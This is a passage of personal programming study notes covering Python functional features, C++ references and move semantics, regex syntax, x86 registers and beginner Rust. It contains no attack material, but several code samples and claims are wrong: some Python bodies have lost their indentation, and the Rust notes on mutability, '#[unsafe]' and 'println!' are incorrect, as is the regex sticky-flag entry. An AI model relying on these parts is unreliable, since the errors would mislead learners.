the function has been evaluated for an input, the result can be stored
and referred to the next time the function of that input is needed,
reducing the number of times the function is called. This is called
<strong>memoization</strong>. - easier to run in parallel.</p>
<blockquote>
<p>The main disadvantage of using only pure functions is that they
majorly complicate the otherwise simple task of I/O, since this
appears to inherently require side effects. They can also be more
difficult to write in some situations.</p>
</blockquote>
<hr />
<h3 id="lambdas"><a class="header" href="#lambdas">Lambdas</a></h3>
<p>Creating a function normally (using <strong>def</strong>) assigns it to a variable
automatically. This is different from the creation of other objects -
such as strings and integers - which can be created on the fly, without
assigning them to a variable. The same is possible with functions,
provided that they are created using <strong>lambda</strong> syntax. Functions
created this way are known as <strong>anonymous</strong>. This approach is most
commonly used when passing a simple function as an argument to another
function. The syntax is shown in the next example and consists of the
<strong>lambda</strong> keyword followed by a list of arguments, a colon, and the
expression to evaluate and return.</p>
<pre><code class="language-py">def my_func(f, arg):
return f(arg)

my_func(lambda x: 2*x*x, 5)
</code></pre>
<blockquote>
<p>Lambda functions get their name from <strong>lambda calculus</strong>, which is a
model of computation invented by Alonzo Church.</p>
</blockquote>
<p>Lambda functions aren’t as powerful as named functions. They can only do
things that require a single expression - usually equivalent to a single
line of code. <strong>Example:</strong></p>
<pre><code class="language-py">#named function
def polynomial(x):
return x**2 + 5*x + 4
print(polynomial(-4))

#lambda
print((lambda x: x**2 + 5*x + 4)  (-4))
</code></pre>
<blockquote>
<p>In the code above, we created an anonymous function on the fly and
called it with an argument.</p>
</blockquote>
<p>Lambda functions can be assigned to variables, and used like normal
functions. <strong>Example:</strong></p>
<pre><code class="language-py">double = lambda x: x * 2
print(double(7))
</code></pre>
<blockquote>
<p>However, there is rarely a good reason to do this - it is usually
better to define a function with <strong>def</strong> instead.</p>
</blockquote>
<hr />
<h3 id="map"><a class="header" href="#map">map</a></h3>
<p>The function <strong>map</strong> takes a function and an iterable as arguments, and
returns a new iterable with the function applied to each argument.
<strong>Example:</strong></p>
<pre><code class="language-py">def add_five(x):
return x + 5

nums = [11,  22,  33,  44,  55]
result = list(map(add_five, nums))
print(result)
</code></pre>
<p>We could have achieved the same result more easily by using <strong>lambda</strong>
syntax.</p>
<pre><code class="language-py">nums = [11,  22,  33,  44,  55]

result = list(map(lambda x: x+5, nums))
print(result)
</code></pre>
<hr />
<h3 id="filter"><a class="header" href="#filter">filter</a></h3>
<p>The function <strong>filter</strong> filters an iterable by removing items that don’t
match a predicate (a function that returns a Boolean). <strong>Example:</strong></p>
<pre><code class="language-py">nums = [11,  22,  33,  44,  55]
res = list(filter(lambda x: x%2==0, nums))
print(res)
</code></pre>
<blockquote>
<p>Like <strong>map</strong>, the result has to be explicitly converted to a list if
you want to print it.</p>
</blockquote>
<hr />
<h2 id="generators"><a class="header" href="#generators">Generators</a></h2>
<p><strong>Generators</strong> are a type of iterable, like lists or tuples. Unlike
lists, they don’t allow indexing with arbitrary indices, but they can
still be iterated through with <strong>for</strong> loops. They can be created using
functions and the <strong>yield</strong> statement. <strong>Example:</strong></p>
<pre><code class="language-py">def countdown():
    i=5
    while i &gt; 0:
        yield i
        i -= 1



for i in countdown():
    print(i)
</code></pre>
<blockquote>
<p>The <strong>yield</strong> statement is used to define a generator, replacing the
return of a function to provide a result to its caller without
destroying local variables.</p>
</blockquote>
<p>Due to the fact that they <strong>yield</strong> one item at a time, generators don’t
have the memory restrictions of lists. In fact, they can be
<strong>infinite!</strong></p>
<pre><code class="language-py">def infinite_sevens():
    while True:
        yield 7

for i in infinite_sevens():
    print(i)
</code></pre>
<p><strong>Result:</strong></p>
<pre><code class="language-py">&gt;&gt;&gt;
7
7
7
7
7
7
7
...
</code></pre>
<blockquote>
<p>In short, <strong>generators</strong> allow you to declare a function that behaves
like an iterator, i.e. it can be used in a <strong>for</strong> loop.</p>
</blockquote>
<p>Finite generators can be converted into lists by passing them as
arguments to the <strong>list</strong> function.</p>
<pre><code class="language-py">def numbers(x):
    for i in  range(x):
        if i % 2 == 0:
            yield i

print(list(numbers(11)))
</code></pre>
<blockquote>
<p>Using <strong>generators</strong> results in improved performance, which is the
result of the lazy (on demand) generation of values, which translates
to lower memory usage. Furthermore, we do not need to wait until all
the elements have been generated before we start to use them.</p>
</blockquote>
<hr />
<h3 id="decorators"><a class="header" href="#decorators">Decorators</a></h3>
<p><strong>Decorators</strong> provide a way to modify functions using other functions.
This is ideal when you need to extend the functionality of functions
that you don’t want to modify. <strong>Example:</strong></p>
<pre><code class="language-py">def decor(func):
    def wrap():
        print("============")
        func()
        print("============")
    return wrap

def print_text():
print("Hello world!")

decorated = decor(print_text)
decorated()
</code></pre>
<p>We defined a function named <strong>decor</strong> that has a single parameter
<strong>func</strong>. Inside <strong>decor</strong>, we defined a nested function named <strong>wrap</strong>.
The <strong>wrap</strong> function will print a string, then call <strong>func()</strong>, and
print another string. The <strong>decor</strong> function returns the <strong>wrap</strong>
function as its result. We could say that the variable <strong>decorated</strong> is
a decorated version of <strong>print_text</strong> - it’s <strong>print_text</strong> plus
something. In fact, if we wrote a useful decorator we might want to
replace <strong>print_text</strong> with the decorated version altogether so we
always got our “plus something” version of <strong>print_text</strong>. This is done
by re-assigning the variable that contains our function:</p>
<pre><code class="language-py">def decor(func):
    def wrap():
        print("============")
        func()
        print("============")
    return wrap

def print_text():
print("Hello world!")

print_text = decor(print_text)
print_text()
</code></pre>
<blockquote>
<p>Now <strong>print_text</strong> corresponds to our decorated version.</p>
</blockquote>
<p>This pattern can be used at any time, to wrap any function. Python
provides support to wrap a function in a decorator by pre-pending the
function definition with a decorator name and the @ symbol. If we are
defining a function we can “decorate” it with the @ symbol like:</p>
<pre><code class="language-py">@decor
def print_text():
    print("Hello world!")

print_text();
</code></pre>
<p>This will have the same result as the above code.</p>
<blockquote>
<p>A single function can have multiple decorators.</p>
</blockquote>
<hr />
<h2 id="recursion"><a class="header" href="#recursion">Recursion</a></h2>
<p><strong>Recursion</strong> is a very important concept in functional programming. The
fundamental part of recursion is self-reference - functions calling
themselves. It is used to solve problems that can be broken up into
easier sub-problems of the same type.</p>
<p>A classic example of a function that is implemented recursively is the
<strong>factorial</strong> function, which finds the product of all positive integers
below a specified number. For example, 5! (5 factorial) is 5 * 4 * 3
* 2 * 1 (120). To implement this recursively, notice that 5! = 5 *
4!, 4! = 4 * 3!, 3! = 3 * 2!, and so on. Generally, n! = n * (n-1)!.
Furthermore, 1! = 1. This is known as the <strong>base case</strong>, as it can be
calculated without performing any more factorials. Below is a recursive
implementation of the factorial function.</p>
<pre><code class="language-py">def factorial(x):
    if x == 1:
        return  1
    else:
        return x * factorial(x-1)

print(factorial(5))
</code></pre>
<blockquote>
<p>The <strong>base case</strong> acts as the exit condition of the recursion.</p>
</blockquote>
<p>Recursive functions can be infinite, just like infinite <strong>while</strong> loops.
These often occur when you forget to implement the base case. Below is
an incorrect version of the factorial function. It has no base case, so
it runs until the interpreter runs out of memory and crashes.</p>
<pre><code class="language-py">def factorial(x):
    return x * factorial(x-1)

print(factorial(5))
</code></pre>
<p>Recursion can also be indirect. One function can call a second, which
calls the first, which calls the second, and so on. This can occur with
any number of functions. <strong>Example:</strong></p>
<pre><code class="language-py">def is_even(x):
    if x == 0:
        return  True
    else:
        return is_odd(x-1)

def is_odd(x):
    return  not is_even(x)

print(is_odd(17))
print(is_even(23))
</code></pre>
<hr />
<h3 id="sets"><a class="header" href="#sets">Sets</a></h3>
<p><strong>Sets</strong> are data structures, similar to lists or dictionaries. They are
created using curly braces, or the <strong>set</strong> function. They share some
functionality with lists, such as the use of <strong>in</strong> to check whether
they contain a particular item.</p>
<pre><code class="language-py">num_set = {1,  2,  3,  4,  5}
word_set = set(["spam",  "eggs",  "sausage"])

print(3  in num_set)
print("spam"  not  in word_set)
</code></pre>
<blockquote>
<p>To create an empty set, you must use <strong>set()</strong>, as <strong>{}</strong> creates an
empty dictionary.</p>
</blockquote>
<p>Sets differ from lists in several ways, but share several list
operations such as <strong>len</strong>. They are unordered, which means that they
can’t be indexed. They <strong>cannot</strong> contain duplicate elements. Due to the
way they’re stored, it’s <strong>faster</strong> to check whether an item is part of
a set, rather than part of a list. Instead of using <strong>append</strong> to add to
a set, use <strong>add</strong>. The method <strong>remove</strong> removes a specific element
from a set; <strong>pop</strong> removes an arbitrary element.</p>
<pre><code class="language-py">nums = {1,  2,  1,  3,  1,  4,  5,  6}
print(nums)
nums.add(-7)
nums.remove(3)
print(nums)
</code></pre>
<blockquote>
<p>Basic uses of <strong>sets</strong> include membership testing and the elimination
of duplicate entries.</p>
</blockquote>
<p>Sets can be combined using mathematical operations. The <strong>union</strong>
operator <strong>|</strong> combines two sets to form a new one containing items in
either. The <strong>intersection</strong> operator <strong>&amp;</strong> gets items only in both. The
<strong>difference</strong> operator <strong>-</strong> gets items in the first set but not in the
second. The <strong>symmetric difference</strong> operator <strong>^</strong> gets items in
either set, but not both.</p>
<pre><code class="language-py">first = {1,  2,  3,  4,  5,  6}
second = {4,  5,  6,  7,  8,  9}

print(first | second)
print(first &amp; second)
print(first - second)
print(second - first)
print(first ^ second)
</code></pre>
<hr />
<h3 id="data-structures"><a class="header" href="#data-structures">Data Structures</a></h3>
<p>As we have seen in the previous lessons, Python supports the following
data structures: <strong>lists</strong>, <strong>dictionaries</strong>, <strong>tuples</strong>, <strong>sets</strong>.</p>
<p><strong>When to use a dictionary:</strong> - When you need a logical association
between a <strong>key:value</strong> pair. - When you need fast lookup for your data,
based on a custom key. - When your data is being constantly modified.
Remember, dictionaries are mutable.</p>
<p><strong>When to use the other types:</strong> - Use <strong>lists</strong> if you have a
collection of data that does not need random access. Try to choose lists
when you need a simple, iterable collection that is modified
frequently. - Use a <strong>set</strong> if you need uniqueness for the elements. -
Use <strong>tuples</strong> when your data cannot change.</p>
<blockquote>
<p>Many times, a <strong>tuple</strong> is used in combination with a <strong>dictionary</strong>,
for example, a <strong>tuple</strong> might represent a key, because it’s
immutable.</p>
</blockquote>
<hr />
<h3 id="itertools"><a class="header" href="#itertools">itertools</a></h3>
<p>The module <strong>itertools</strong> is a standard library that contains several
functions that are useful in functional programming. One type of
function it produces is infinite iterators. The function <strong>count</strong>
counts up infinitely from a value. The function <strong>cycle</strong> infinitely
iterates through an iterable (for instance a list or string). The
function <strong>repeat</strong> repeats an object, either infinitely or a specific
number of times. <strong>Example:</strong></p>
<pre><code class="language-py">from itertools import count
for i in count(3):
    print(i)
    if i &gt;=11:
        break
</code></pre>
<p>There are many functions in <strong>itertools</strong> that operate on iterables, in
a similar way to <strong>map</strong> and <strong>filter</strong>. Some examples: <strong>takewhile -</strong>
takes items from an iterable while a predicate function remains true;
<strong>chain -</strong> combines several iterables into one long one; <strong>accumulate
-</strong> returns a running total of values in an iterable.</p>
<pre><code class="language-py">from itertools import accumulate, takewhile
nums = list(accumulate(range(8)))
print(nums)
print(list(takewhile(lambda x: x&lt;= 6, nums)))
</code></pre>
<p>There are also several combinatoric functions in <strong>itertool</strong>, such as
<strong>product</strong> and <strong>permutation</strong>. These are used when you want to
accomplish a task with all possible combinations of some items.
<strong>Example:</strong></p>
<pre><code class="language-py">from itertools import product, permutations
letters = ("A",  "B")
print(list(product(letters,  range(2))))
print(list(permutations(letters)))
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="references"><a class="header" href="#references">references</a></h1>
<p>C++11 introduced 5 types of objects; <strong>lvalues, rvalues, glvalues, prvalues, xvalues</strong>.</p>
<ul>
<li>An <em>lvalue</em> is a regular variable. That’s it. A regular variable.</li>
<li>A <em>prvalue</em> is a literal value.</li>
</ul>
<pre><code class="language-cpp">int x = 5;
//here x is an lvalue and 5 is a prvalue
</code></pre>
<ul>
<li>An <em>xvalue</em> is an expiring value. Particularly those that are returned from a function. They were <em>lvalues</em> initially but are going to run out of scope soon. So their contents can be <strong>moved</strong> safely. What does <strong>move</strong> mean here?</li>
</ul>
<p>It means that the contents can now be safely renamed to something else because the previous name will soon not be valid.</p>
<pre><code class="language-cpp">int b(int x){
    int y = x*x;
    return y;
    //over here y is an lvalue that is soon going to go out of scope. So internally, its memory need not be copied. Internally the value that is binding to the return value can simply be optimised to refer to the original memory since it is the sole owner of the memory.
}

int main(){
    int z = 0;
    int k = b(z);
    //over here, k will simply start pointing to the original memory owned by y inside the function b; we say that the resource has moved from y inside the function to k outside the function.
}
</code></pre>
<ul>
<li>A <em>glvalue</em> is either an <em>lvalue</em> or an <em>xvalue</em>.</li>
<li>An <em>rvalue</em> is either a <em>prvalue</em> or an <em>xvalue</em>.</li>
</ul>
<p>An <strong>rvalue’s</strong> resources can be moved safely.</p>
<h2 id="lvalue-references"><a class="header" href="#lvalue-references">lvalue references</a></h2>
<p>An <code>lvalue</code> reference can be thought of as an <em>alias</em> to the variable, an alternate name.</p>
<pre><code class="language-cpp">int x = 5;
int &amp;y = x;

cout &lt;&lt; (&amp;y == &amp;x ? "true": "false") &lt;&lt; '\n';
//returns true because both the values point to the same location

y = 6;
cout &lt;&lt; x &lt;&lt; '\n';
// will print 6;
</code></pre>
<p>Also read <a href="notes/./cv_qualifiers.html">cv-qualifiers</a>.</p>
<p>Lvalues reference can’t bind to an rvalue or a const-lvalue. A reference to a const lvalue, however, can.</p>
<pre><code class="language-cpp">int &amp;x = 5; //error
const int &amp;x = 5; //ok, but x cannot be modified
const int v= 2;
const int &amp;l = v; //ok, but l cannot be modified
</code></pre>
<h3 id="pass-by-reference-in-functions"><a class="header" href="#pass-by-reference-in-functions">Pass by reference in functions</a></h3>
<p>Take the function <code>void sqr(int x)</code>. Suppose it does</p>
<pre><code class="language-cpp">void sqr(int x){
    x = x*x;
}
</code></pre>
<p>For very obvious reasons it won’t work. The assignment is in local scope, and the variable is <strong>copied</strong> into the scope of the function before anything else is done.</p>
<p>In C, we solved this problem using pointers. In C++, we can instead pass the reference to <code>x</code>.</p>
<pre><code class="language-cpp">void sqr(int &amp;x){
    x = x*x;
}
</code></pre>
<p>Now the function will work as expected.</p>
<h3 id="return-by-reference-and-dangling-references"><a class="header" href="#return-by-reference-and-dangling-references">Return by reference and Dangling references</a></h3>
<p>When the object being referenced to is destroyed before its reference, it is called a <strong>dangling reference</strong>.</p>
<p>Suppose the function signature is this:</p>
<pre><code class="language-cpp">int &amp; ret(int &amp;x){
    int y = x; // copy of x being formed
    return y;
}
</code></pre>
<p>This is clearly problematic. By the time the function’s return binds to something, the object it is referring to is already destroyed. This is an example of a dangling reference. This is also true for <em>prvalues</em>.</p>
<p>If however, the return type was a <code>const int&amp;</code> and the variable being returned was static, then it will work.</p>
<pre><code class="language-cpp">const int &amp; ret (int &amp;x){
    const static int y = x; // static copy formed
    return y; // ok, object exists till the end of the program lifetime
}
</code></pre>
<blockquote>
<p>This happens because a static object is created at the beginning of the program and stays in memory till the end of the program.</p>
</blockquote>
<p>It would work, in theory, to bind a const reference to a non-const static variable. However, the results can be unpredictable so it isn’t advised.</p>
<p>Eg.</p>
<pre><code class="language-cpp">const int &amp; fun(){
    static int y = 0;
    y++;
    return y;
}

int main(){
    const int&amp; id = fun();
    const int&amp; id1 = fun();
    cout &lt;&lt; id &lt;&lt; id1 &lt;&lt; '\n'; // prints 22 instead of the expected 12
}
</code></pre>
<p>Instead, we can bind it with a regular variable so that a copy is made.</p>
<p>It is perfectly ok to return a reference to a pass-by-reference parameter, since the object will continue to exist even after the function scope ends.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="regex"><a class="header" href="#regex">regex</a></h1>
<p>General format:</p>
<p><code>/character-set/flags</code></p>
<h2 id="character-classes"><a class="header" href="#character-classes">Character classes</a></h2>
<blockquote>
<p>Use brackets to create capture groups, helpful for logical operator <code>|</code>. <code>&amp;</code> is implicit.</p>
</blockquote>
<p><code>.</code> : Match all characters except newlines. Also see the <code>/s</code> flag.</p>
<p><code>\w</code> : Any word. Same as <code>[A-Za-z0-9_]</code>.</p>
<p><code>\W</code> : Opposite of <code>\w</code>.</p>
<p><code>\d</code> : Any digit. Same as <code>[0-9]</code>.</p>
<p><code>\D</code> : Opposite of <code>\d</code>.</p>
<p><code>\s</code> : Matches a witespace.</p>
<p><code>\S</code> : Match anything that is not a whitespace. Used in conjunction with <code>\s</code> to match anything, inculding line breaks.</p>
<p><code>[]</code> : Character set. Used to choose any of the characters in the bracket. A range can be specified with a <code>-</code> in between two characters. Eg: <code>[A-Z]</code></p>
<p><code>[^]</code> : Negated character set. <em>DO NOT</em> match any of the letters inside.</p>
<p><code>()</code> : Capture group.</p>
<h2 id="anchors-and-quantifiers"><a class="header" href="#anchors-and-quantifiers">Anchors and Quantifiers</a></h2>
<p><code>^</code> : Beginning of the text. See also the <code>/m</code> flag.</p>
<p><code>$</code> : Matches the end of the text.</p>
<p><code>*</code> : Match 0 or more of the preceding token.</p>
<p><code>+</code> : Match 1 or more of the preceding token.</p>
<p><code>?</code> : Make the previous token optional.</p>
<p><code>+?</code>/<code>*?</code> : Make the search lazy. This matches as few characters as possible.</p>
<p><code>|</code> : Boolean <code>OR</code>. Match the expression before or after.</p>
<h2 id="flags"><a class="header" href="#flags">Flags</a></h2>
<p>Flags can be one of the following:</p>
<ul>
<li>global - <code>/g</code></li>
<li>case insensitive - <code>/i</code></li>
<li>multiline <code>/m</code></li>
</ul>
<p>Multiline makes the anchors catch all lines instead of the string beginning and ending.</p>
<ul>
<li>unicode <code>/u</code></li>
</ul>
<p>When the unicode flag is enabled, you can use extended unicode escapes in the form <code>\x{FFFFF}</code>.</p>
<ul>
<li>sticky <code>/y</code></li>
</ul>
<p>Undo the global flag.</p>
<ul>
<li>dotall <code>/s</code></li>
</ul>
<p>Dot (<code>.</code>) will match newlines as well.</p>
<p>The flags can be combined. Eg: <code>/ms</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="registers-2"><a class="header" href="#registers-2">registers</a></h1>
<h2 id="general-purpose-register"><a class="header" href="#general-purpose-register">General Purpose Register</a></h2>
<p>There are 3 types of General-purpose data registers they are:</p>
<h3 id="data-registers"><a class="header" href="#data-registers">Data registers</a></h3>
<p>Data registers consists of four 32-bit data registers, which are used for arithmetic, logical and other operations.</p>
<p>They are mostly used for storing temporary variables during instruction execution. They are mostly meant to do arithmetic manipulation.</p>
<p>Data registers are again classified into 4 types they are:</p>
<ul>
<li>AX: Accumulator register. Its bits are split into two registers, AH and AL, allowing it to execute half bit-width instructions as well.</li>
<li>BX: Base register. Split into BH and BL.</li>
<li>CX: Count register. This acts as a counter for loops.</li>
<li>DX: This is known as the Data register. In I/O operations, the data register can be used as a port number.</li>
</ul>
<h3 id="pointer-registers"><a class="header" href="#pointer-registers">Pointer registers</a></h3>
<p>The pointer registers consist of 16-bit left sections (SP, and BP) and 32-bit ESP and EBP registers.</p>
<p>They are mostly used for storing pointers.</p>
<ul>
<li>SP: This is known as a Stack pointer used to point the program stack. For accessing the stack segment, it works with SS. It has a 16-bit size. It designates the item at the top of the stack. The stack pointer will be (FFFE)H if the stack is empty. The stack segment is relative to its offset address.</li>
<li>BP: This is known as the Base pointer used to point data in the stack segments. We can utilize BP to access data in the other segments, unlike SP. It has a 16-bit size. It mostly serves as a way to access parameters given via the stack. The stack segment is relative to its offset address.</li>
</ul>
<h3 id="index-registers"><a class="header" href="#index-registers">Index registers</a></h3>
<p>The 16-bit rightmost bits of the 32-bit ESI and EDI index registers. SI and DI are sometimes employed in addition and sometimes in subtraction as well as for indexed addressing.</p>
<p>They are used for accessing memory segments where data needs to be read from and written to.</p>
<ul>
<li>SI: This source index register is used to identify memory addresses in the data segment that DS is addressing. Therefore, it is simple to access successive memory locations when we increment the contents of SI. It has a 16-bit size. Relative to the data segment, it has an offset.</li>
<li>DI: The function of this destination index register is identical to that of SI. String operations are a subclass of instructions that employ DI to access the memory addresses specified by ES. It is generally used as a Destination index for string operations.</li>
</ul>
<h2 id="special-purpose-registers"><a class="header" href="#special-purpose-registers">Special Purpose Registers</a></h2>
<blockquote>
<p>Most of them became useless and obsolete with anything greater than 16 bit registers.</p>
</blockquote>
<p>To store machine state data and change state configuration, special purpose registers are employed. In other words, it is also defined as the CPU has a number of registers that are used to carry out instruction execution these registers are called special purpose registers. Special purpose registers are of 8 types they are cs, ds, ss, es, fs, and gs registers come under segment registers. These registers hold up to six segment selectors.</p>
<ul>
<li>CS (Code Segment register): A 16-bit register called a code segment (CS) holds the address of a 64 KB section together with CPU instructions. All accesses to instructions referred to by an instruction pointer (IP) register are made by the CPU using the CS segment. Direct changes to CS registration are not possible. When using the far jump, far call, and far return instructions, the CS register is automatically updated.</li>
<li>DS (Data Segment register): A 64KB segment of program data is addressed using a 16-bit register called the data segment. The processor by default believes that the data segment contains all information referred to by the general registers (AX, BX, CX and DX) and index registers (SI, DI). POP and LDS commands can be used to directly alter the DS register.</li>
<li>SS (Stack Segment register): A 16-bit register called a stack segment holds the address of a 64KB segment with a software stack. The CPU by default believes that the stack segment contains all information referred to by the stack pointer (SP) and base pointer (BP) registers. POP instruction allows for direct modification of the SS register.</li>
<li>ES (Extra Segment register): A 16-bit register called extra segment holds the address of a 64KB segment, typically holding program data. In string manipulation instructions, the CPU defaults to assuming that the DI register refers to the ES segment. POP and LES commands can be used to directly update the ES register.</li>
<li>FS (File Segment register): FS registers don’t have a purpose that is predetermined by the CPU; instead, the OS that runs them gives them a purpose. On Windows processes, FS is used to point to the thread information block (TIB). On 64 bit unix systems, they are always 0.</li>
<li>GS (Graphics Segment register): The GS register is used in Windows 64-bit to point to operating system-defined structures. OS kernels frequently use GS to access thread-specific memory. The GS register is employed by Windows to control thread-specific memory. To access CPU-specific memory, the Linux kernel employs GS. A pointer to a thread local storage, or TLS, is frequently used as GS.</li>
<li>IP (Instruction Pointer register): The registers CS and IP are used by the 8086 to access instructions. The segment number of the following instruction is stored in the CS register, while the offset is stored in the IP register. Every time an instruction is executed, IP is modified to point to the upcoming instruction. The IP cannot be directly modified by an instruction, unlike other registers; an instruction may not have the IP as its operand.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust_notes"><a class="header" href="#rust_notes">rust_notes</a></h1>
<h2 id="creating-projects"><a class="header" href="#creating-projects">Creating Projects</a></h2>
<p>To create a new project:</p>
<pre><code class="language-bash">cargo new project
cd project
</code></pre>
<p><code>Cargo.toml</code> contains and tracks our version info and dependencies. By default the project is set up as a git repo.</p>
<p>A <code>main.rs</code> is already set up in the src repository.</p>
<pre><code class="language-bash">cargo run
</code></pre>
<p>Build and run the project.</p>
<h2 id="using-libraries"><a class="header" href="#using-libraries">Using libraries</a></h2>
<pre><code class="language-rust">use std::io;</code></pre>
<p>Includes the <code>io</code> library that is used for taking input and output.</p>
<h2 id="structure"><a class="header" href="#structure">Structure</a></h2>
<p>By default, the <code>main</code> function is the one the is executed first. Default Rust style is to indent with four spaces and not a tab. <em>This is important.</em></p>
<h2 id="variables-2"><a class="header" href="#variables-2">Variables</a></h2>
<p>Declaration of variables occurs as follows:</p>
<pre><code class="language-rust">fn main() {
    let x = 5;
}</code></pre>
<p>This is the declaration of an <em>immutable</em> variable. An <em>immutable</em> variable being changed does not compile. All variables are immutable by default.</p>
<p>To declare a <em>mutable</em> variable (one whose value does not change), we need to use the <code>mut</code> keyword after <code>let</code>.</p>
<pre><code class="language-rust">fn main(){
    let mut x = 5;
    // value of x being changed here.
    x = 6;
}</code></pre>
<p>We can use the <code>let</code> keyword to redefine a variable. This allows us to change a variable’s type, <code>mut</code> does not.</p>
<pre><code class="language-rust">fn main(){
    let x = 5;
    println!({x});
    let x = x + 1;
    println!({x});
}</code></pre>
<blockquote>
<p>The previous memory is not being overwritten. Just that <code>x</code> now points to a new memory in the storage with the updated value. This creates two blocks of memories that store values, one with the value 5, another with the value 6.</p>
</blockquote>
<h2 id="constants"><a class="header" href="#constants">Constants</a></h2>
<p>Using constants allows you to use hardcoded values in your code. They are always immutable and can be declared globally as well, unlike variables.</p>
<blockquote>
<p>Technically variables can be declared globally but only by the use of <code>#[unsafe]</code>.</p>
</blockquote>
<p>Unlike variables, the type of constant must be explicitly annotated. Like variables, they can be used to perform minor (extremely limited) calculations.</p>
<h2 id="data-types-1"><a class="header" href="#data-types-1">Data Types</a></h2>
<h3 id="integers---signed-or-unsigned"><a class="header" href="#integers---signed-or-unsigned">Integers - Signed or Unsigned</a></h3>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Bit length</th><th style="text-align: center">Signed</th><th style="text-align: center">Unsigned</th></tr></thead><tbody>
<tr><td style="text-align: center">8</td><td style="text-align: center">i8</td><td style="text-align: center">u8</td></tr>
<tr><td style="text-align: center">16</td><td style="text-align: center">i16</td><td style="text-align: center">u16</td></tr>
<tr><td style="text-align: center">32</td><td style="text-align: center">i32</td><td style="text-align: center">u32</td></tr>
<tr><td style="text-align: center">64</td><td style="text-align: center">i64</td><td style="text-align: center">u64</td></tr>
<tr><td style="text-align: center">128</td><td style="text-align: center">i128</td><td style="text-align: center">u128</td></tr>
<tr><td style="text-align: center">architecture-dependent</td><td style="text-align: center">isize</td><td style="text-align: center">usize</td></tr>
</tbody></table>
</div>
<p>Signed ints are stored as <a href="https://en.wikipedia.org/wiki/Two%27s_complement">Two’s Complement</a>.</p>
<p>Integer literals can have <code>_</code> in them to make them more readable. They can also be annotated with their type at the last, like <code>786u16</code>. They can also be specified to use number bases such as binary (<code>0b1000</code>), hexadecimal (<code>0xa7</code>), octal (<code>0o77</code>), and a single byte representation (<code>b1</code>).</p>
<blockquote>
<p>The single byte representation stores them as u8 behind the scenes.</p>
</blockquote>
<blockquote>
<p>Add integer overflow for int Types</p>
</blockquote>
<h3 id="floating-points"><a class="header" href="#floating-points">Floating Points</a></h3>
<p><code>f32</code>: 32 bit floating point
<code>f64</code>: 64 bit floating point</p>
<p>Default is 64 bits. They conform to <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE-754 Standards</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rvalue-refs"><a class="header" href="#rvalue-refs">rvalue refs</a></h1>
<p>Introduced on C++11, these are references to rvalues. These exist to extend the object lifetime of an rvalue, say, a function return value.</p>
<blockquote>
<p>Note: <code>int i = 1; int j = i--;</code>. Here <code>i--</code> is an rvalue.</p>
</blockquote>
<p>These are marked with <code>&amp;&amp;</code>. An rvalue reference is an object that the caller no longer cares about. It is disposable and so the <strong>ownership</strong> (the ability to destroy the object) goes to the thing it is being bound to.</p>
<blockquote>
<p>NOTE: in case of template parameters and <code>auto</code> keyword, <code>&amp;&amp;</code> refers to <strong>universal reference</strong> and not rvalue reference.</p>
</blockquote>
<h2 id="move-semantics"><a class="header" href="#move-semantics">move semantics</a></h2>
<p>Usually, with rvalues and rvalue refs, the compiler <em>moves</em> the object rather than copying it. Internally, it means that the storage that was taken up by the object is now being pointed to by the new variable it is bound to. If you want to explicitly move something, we can use <code>std::move</code> which is effectively <code>static_cast&lt;T&amp;&amp;&gt;</code>. It converts the object to an rvalue reference so that ownership can be moved easily.</p>
<ul>
<li>function returns that are local to the function are moved except when they are static.</li>
<li>When given a parameter as an rvalue ref, it is, <strong>inside the function body</strong>, an lvalue. This is because it is a name and all named things are lvalues.</li>
<li>This is also true when an rvalue ref is bound to a prvalue. It becomes a named object, and therefore, an lvalue.</li>
</ul>
<pre><code class="language-cpp">void fun(int&amp;&amp; x){
    //do something;
}

void fun(int&amp; x){
    //do something
}

int main(){
    int &amp;&amp;ref{5};
    int x = 5;
    fun(x); //calls lvalue ref overload
    fun(ref); //STILL CALLS LVALUE REF overload
    fun(std::move(ref)); //ok, calls rvalue overload
}
</code></pre>
<p>You can use differing print statements in the above two function overloads to verify.</p>
<p>One major difference between const lvalue refs and rvalue refs is that rvalue refs allow us to modify the temporary and take ownership of it. In case of lvalues it is not possible.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="static_variables_and_functions"><a class="header" href="#static_variables_and_functions">static_variables_and_functions</a></h1>
<h2 id="static-variables"><a class="header" href="#static-variables">static variables</a></h2>
<p>Initialised at the beginning of the program, before the <code>main</code> function is called. Stored in the <code>data</code> section of the program if initialised or <code>bss</code> if not. Basically shares a location with a global variable.</p>
<p>It cannot be used as a global var. I expected it to work with extern in another function, mostly <code>main</code>, but it didn’t. Hence it can only be used by the function in the same scope.</p>
<p>Static variables of classes don’t have such restrictions and can be used anywhere.</p>
<p>Static is only meant for file linking, for global static to be used in another file use <code>extern</code>.</p>
<h2 id="static-functions"><a class="header" href="#static-functions">static functions</a></h2>
<p>Static functions once again follow the same file level linking that variables follow. More precisely, it is available to the same translation unit. So if a file <code>A.cpp</code> has an include <code>B.cpp</code> and <code>B.hpp</code> then the files will be added.</p>
<h2 id="static-methods"><a class="header" href="#static-methods">static methods</a></h2>
<p>These are methods that do not need the existence of an object to be called. They can be called from the class itself, as <code>Graph::BST()</code>.</p>
<p>There are some limitations of static methods includes the fact that you cant use the <code>this</code> pointer inside the method.</p>
<pre><code class="language-cpp">#include &lt;iostream&gt;

class init {
public: 
  init();
  static void printo() { std::cout &lt;&lt; "hello" &lt;&lt; '\n'; }
  ~init();

private:
  int x;
};

int main() { init::printo(); }
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="stdforward"><a class="header" href="#stdforward">std::forward</a></h1>
<p>Most of the article was inspired from this <a href="https://stackoverflow.com/a/3582313">brilliant</a> answer from stackoverflow.</p>
<h2 id="forwarding"><a class="header" href="#forwarding">Forwarding</a></h2>
<p>Given an expression <code>E(a,b,c,d ...)</code>, each of some templated type, we want <code>f(a,b,c,d...)</code> to be equivalent. So nest <code>E</code> inside <code>f</code>.</p>
<p>This cannot be accomplished by C++03.</p>
<ul>
<li>Case 1: you use lvalue refs for <code>f</code>. This fails to handle rvalue cases.</li>
<li>Case 2: const lvalue refs. Now the arguments are rendered unmodifiable for <code>E</code>.</li>
